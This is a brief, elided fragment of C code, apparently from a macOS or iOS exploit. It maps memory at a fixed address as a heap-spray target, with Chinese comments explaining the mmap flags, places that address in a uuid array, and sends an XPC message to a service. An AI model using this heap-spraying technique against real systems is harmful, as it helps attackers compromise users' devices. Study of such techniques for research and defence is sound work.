...
{
    void* heap_spray_target_addr = (void*)0x1fec000;//0x1fec000
    
    //MAP_ANON:匿名映射，映射区不与任何文件关联
    //MAP_PRIVATE:建立一个写入时拷贝的私有映射。内存区域的写入不会影响到原文件。这个标志和以上标志是互斥的，只能使用其中一个。
    //MAP_FIXED:使用指定的映射起始地址，如果由start和len参数指定的内存区重叠于现存的映射空间，重叠部分将会被丢弃。如果指定的起始地址不可用，操作将会失败。并且起始地址必须落在页的边界上。
    struct heap_spray* hs = mmap(heap_spray_target_addr, 0x1000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
    ...
    */
    ...
    //0x1fec000
    uint32_t uuid[] = {0x12345678, 0x1fec000};//0x1fec000
    ...
    xpc_connection_send_barrier(client, ^{printf("other side has enqueued this message\n");});
